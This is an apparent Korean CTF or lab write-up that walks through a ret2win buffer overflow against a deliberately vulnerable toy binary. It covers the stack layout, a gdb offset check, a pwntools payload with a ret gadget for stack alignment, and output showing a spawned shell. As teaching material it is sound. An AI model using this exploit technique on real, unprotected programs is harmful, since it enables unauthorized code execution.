# 01 · BOF → ret2win 디버깅

## 소스 요지
```c
void win() { system("/bin/sh"); }      // 목표
void vuln() {
    char buf[0x30];
    read(0, buf, 0x100);               // 0x30 버퍼에 0x100 읽기 → 오버플로우
}
```
`checksec`: No Canary / NX / No-PIE → **리턴주소만 덮으면 끝**.

## 1) 스택 배치 파악
```
$ objdump -d vuln
  4011c4: mov    %rsp,%rbp
  4011c7: sub    $0x30,%rsp          ; 지역공간 0x30
  4011da: lea    -0x30(%rbp),%rax    ; buf = rbp-0x30
  4011eb: call   read@plt
```
`buf = rbp-0x30`. 스택은:
```
rbp-0x30  [ buf (0x30) ]
rbp       [ saved rbp (8) ]
rbp+8     [ return addr  ]   ← 덮을 곳
```
→ ret까지 거리 = `0x30 + 8 = 0x38 (56)`.

## 2) cyclic으로 오프셋 검증
```
$ python -c "from pwn import *; sys.stdout.buffer.write(cyclic(0x60))" > /tmp/cyc.bin
$ gdb -q ./vuln
pwndbg> run < /tmp/cyc.bin
Program received signal SIGSEGV, Segmentation fault.
0x00000000004011aa in vuln ()       ← ret 실행 순간 죽음
pwndbg> info registers rsp rip
rsp  0x7fffffffd628
rip  0x4011aa <vuln+47>
pwndbg> x/s $rsp
0x7fffffffd628: "oaaapaaaqaaaraaa..."   ← rsp가 패턴을 가리킴
```
```
$ python -c "from pwn import *; print(cyclic_find('oaaa'))"
56                                   ← 0x38, 1)과 일치
```

## 3) 익스
```python
offset = 0x38
ret    = 0x40101a                    # 단독 ret 가젯 (ROPgadget로 확인)
payload = b'A'*offset + p64(ret) + p64(e.symbols['win'])
```
- `ret` 가젯을 한 개 끼우는 이유: `system()` 내부 `movaps`는 **rsp가 16바이트 정렬**이어야 함.
  `win`만 바로 넣으면 정렬이 8 어긋나 `movaps`에서 SIGSEGV. `ret` 하나로 8바이트 밀어 정렬.

## 4) 동작 확인
```
$ make run
[win] you got the shell!
PWNED
```
